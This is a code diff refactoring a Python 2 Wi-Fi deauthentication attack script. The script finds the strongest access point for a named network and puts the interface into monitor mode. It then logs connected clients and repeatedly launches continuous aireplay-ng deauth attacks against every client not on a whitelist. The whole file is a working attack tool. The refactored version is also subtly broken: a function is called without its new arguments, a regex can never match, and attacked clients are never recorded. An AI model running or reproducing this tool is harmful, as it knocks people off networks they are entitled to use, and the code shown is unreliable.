@@ -8,165 +8,153 @@ from subprocess import Popen, PIPE
 
 from parse_args import parse_args
 
+attack_clients = set()
+attack_pids    = set()
 
-args = None
-attack_clients = []
-attack_pids = []
+MAC_REGEX  = r'[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}'
+TMP_PREFIX = '/tmp/airodump-output'
 
-class apinfo:
-    bssid = None
-    channel = None
-    power = None
+class Target(object):
+    def __init__(self):
+        self.bssid = self.channel = self.power = None
 
-    def isvalid(self):
-        if not self.bssid or not self.channel or not self.power:
-            return False
-        return True
+    def __nonzero__(self):
+        return self.bssid and self.channel and self.power
 
-# extract all unique MAC addresses from an airodump csv output file (f)
 def get_clients(f):
-    clients = []
-    regex = '^([0-9A-F]{2}:)+[0-9A-F]{2}$'
+    """Extract set of MAC addresses from given airodump CSV output file."""
+
+    regex = re.compile(MAC_REGEX)
+
     with open(f, 'rb') as csvfile:
-        reader = csv.reader(csvfile)
-        for row in reader:
-            if len(row) and re.match(regex, row[0]) and not row[0] in clients:
-                clients.append(row[0])
+        reader  = csv.reader(csvfile)
+        clients = {row[0] for row in reader if row and regex.match(row[0])}
+
     return clients
 
-# find the BSSID of the strongest AP matching the specified ESSID
-def get_ap_bssid():
+def open_or_die(args, communicate=True):
     try:
-        p = Popen(['iwlist', args.interface, 'scan'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        p = Popen(args, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     except OSError as e:
-        print e
-        sys.exit()
+        sys.exit(e)
 
-    output, err = p.communicate()
-    if p.returncode > 0:
-        print err
-        sys.exit()
+    if not communicate:
+        return p
 
-    valid = False
-    info = apinfo()
+    out, err = p.communicate()
+    if p.returncode:
+        sys.exit(err)
+    return out
 
-    lines = output.split('\n')
-    for line in reversed(lines):
+def get_ap_bssid(interface, essid):
+    """Find BSSID of strongest AP matching specified ESSID."""
+
+    output = open_or_die(['iwlist', interface, 'scan'])
+    target = Target()
+    valid  = False
+
+    essid_re   = re.compile(r'"(.*)"$')
+    bssid_re   = re.compile(r'Address: ({})$'.format(MAC_REGEX))
+    power_re   = re.compile(r'level=([^\S]+)$')
+    channel_re = re.compile(r'Channel:(\d+)')
+
+    for line in reversed(output.splitlines()):
         l = line.strip()
         if not len(l):
             continue
-        if l.startswith("ESSID"):
+        if l.startswith('ESSID'):
             valid = False
-            m = re.search(re.compile('"(.*)"'), l)
-            if m and m.group(1) == args.essid:
+            m = essid_re.search(l)
+            if m and m.group(1) == essid:
                 valid = True
                 continue
         if not valid:
             continue
-        if l.startswith("Quality"):
-            m = re.search(re.compile('level=([^\ ]+)'), l)
-            if m and (not info.power or int(m.group(1)) > int(info.power)):
-                info.power = m.group(1)
+        if l.startswith('Quality'):
+            m = power_re.search(l)
+            if m and (not target.power or int(m.group(1)) > int(target.power)):
+                target.power = m.group(1)
             else:
                 valid = False
-        elif l.startswith("Channel"):
-            m = re.search(re.compile('Channel:([0-9]+)'), l)
+        elif l.startswith('Channel'):
+            m = channel_re.search(l)
             if m:
-                info.channel = int(m.group(1))
+                target.channel = int(m.group(1))
             else:
                 valid = False
-        elif l.startswith("Cell"):
-            m = re.search(re.compile('Address: ([0-9A-F:]+)$'), l)
+        elif l.startswith('Cell'):
+            m = bssid_re.search(l)
             if m:
-                info.bssid = m.group(1)
+                target.bssid = m.group(1)
             else:
                 valid = False
-    if info.isvalid():
-        return info
-    return None
+    return target
 
-# brings up the wireless interface so it can be used. this has no effect if the interface is already up
-def initialise_interface():
-    try:
-        p = Popen(['ifconfig', args.interface, 'up'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    except OSError as e:
-        print e
-        sys.exit()
-    output, err = p.communicate()
-    if p.returncode > 0:
-        print err
-        sys.exit()
+def initialise_interface(interface):
+    """Bring up wireless interface; has no effect if interface already up."""
+    open_or_die(['ifconfig', interface, 'up'])
 
-# create a monitoring interface using the specified wlan interface, on the specified channel
-def create_monitor_interface(channel):
-    try:
-        p = Popen(['airmon-ng', 'start', args.interface, str(channel)], stdin=PIPE, stdout=PIPE, stderr=PIPE)
-    except OSError as e:
-        print e
-        sys.exit()
-    output, err = p.communicate()
-    if p.returncode > 0:
-        print err
-        sys.exit()
-    m = re.search(re.compile("monitor mode enabled on ([^\)]+)"), output)
-    if m:
-        return m.group(1)
-    return None
+def create_monitor_interface(interface, channel):
+    """Create a monitoring interface with the given wlan interface and channel."""
+    output = open_or_die(['airmon-ng', 'start', interface, str(channel)])
+    m = re.compile(r'monitor mode enabled on ([^)]+)').search(output)
+    return m.group(1) if m else None
 
-# start (and detach from) the airodump process. it will regularly write its output to a csv file in /tmp/output
 def start_airodump(iface, channel, bssid):
-    ts = str(int(time.time()))
-    try:
-        p = Popen(['airodump-ng', iface, '-c', str(channel), '--bssid', bssid, '-w', '/tmp/airodump-output'+ts, '-o', 'csv'],
-                  stdout=PIPE, stdin=PIPE, stderr=PIPE)
-    except OSError as e:
-        print e
-        sys.exit()
-    return p.pid, '/tmp/airodump-output'+ts+'-01.csv'
+    """Start (and detach from) airodump process.
 
-# spawn a new aireplay instance to attack a specific client
+    The process will regularly write its output to a CSV file in /tmp/
+    """
+
+    tmpfile = '{}{}'.format(TMP_PREFIX, int(time.time()))
+
+    p = open_or_die(['airodump-ng', iface, '-c', str(channel),
+                     '--bssid', bssid, '-w', tmpfile, '-o', 'csv'],
+                    communicate=False)
+
+    return p.pid, tmpfile + '-01.csv'
+
 def spawn_attack(iface, c_bssid, ap_bssid):
-    try:
-        p = Popen(['aireplay-ng', '-0', '0', iface, '-c', c_bssid, '-a', ap_bssid, '--ignore-negative-one'],
-                  stdout=PIPE, stdin=PIPE, stderr=PIPE)
-    except OSError as e:
-        print e
+    """Spawn new aireplay instance to attack specific client."""
+
+    p = open_or_die(['aireplay-ng', '-0', '0', iface, '-c', c_bssid,
+                     '-a', ap_bssid, '--ignore-negative-one'],
+                    communicate=False)
     return p.pid
 
-# start the attack by spawning instances for each client on the network that's not in the whitelist
-def start_attack(output, iface, bssid):
+def start_attack(output, iface, bssid, whitelist):
+    """Spawn instances for each network client not in the given whitelist."""
     while True:
-        clients = get_clients(output)
-        diff = list(set(clients) - set(attack_clients))
-        for item in diff:
-            if item != bssid and item not in args.whitelist:
+        for item in get_clients(output) - attack_clients:
+            if item != bssid and item not in whitelist:
                 pid = spawn_attack(iface, item, bssid)
-                attack_pids.append(pid)
+                attack_pids.add(pid)
         time.sleep(5)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     args = parse_args()
-    print "Bringing up interface \""+args.interface+"\"..."
-    initialise_interface()
-    print "> OK"
 
-    print "Finding BSSID for \""+args.essid+"\"..."
-    info = get_ap_bssid()
-    if not info:
-        print "Failed to find BSSID for \""+args.essid+"\"! Check that the ESSID is correct and you're in range."
-        sys.exit()
-    print "> Found \""+args.essid+"\": BSSID="+info.bssid+", Channel="+str(info.channel)+", Power="+str(info.power)
+    print 'Bringing up interface "{}"...'.format(args.interface)
+    initialise_interface(args.interface)
+    print '> OK'
 
-    print "Creating monitoring interface on channel "+str(info.channel)+"..."
-    mon = create_monitor_interface(info.channel)
+    print 'Finding BSSID for "{}"...'.format(args.essid)
+    target = get_ap_bssid()
+    if not target:
+        sys.exit('Failed to find BSSID for "{}"! Check that the ESSID is '
+                 'correct and that you are in range'.format(args.essid))
+    print ('> Found "{}": BSSID={}, Channel={}, Power={}'
+           .format(args.essid, target.bssid, target.channel, target.power))
+
+    print 'Creating monitoring interface on channel {}...'.format(target.channel)
+    mon = create_monitor_interface(args.interface, target.channel)
     if not mon:
-        print "Failed to create monitoring interface!"
-        sys.exit()
-    print "> Created monitoring interface "+mon
+        sys.exit('Failed to create monitoring interface!')
+    print '> Created monitoring interface ' + mon
 
-    print "Spawning airodump process..."
-    pid,output = start_airodump(mon, info.channel, info.bssid)
-    print "> airodump pid="+str(pid)+", writing to "+output
+    print 'Spawning airodump process...'
+    pid, output = start_airodump(mon, target.channel, target.bssid)
+    print '> airodump pid={}, writing to {}'.format(pid, output)
 
-    print "Starting attack manager..."
-    start_attack(output, mon, info.bssid)
+    print 'Starting attack manager...'
+    start_attack(output, mon, target.bssid, set(args.whitelist))
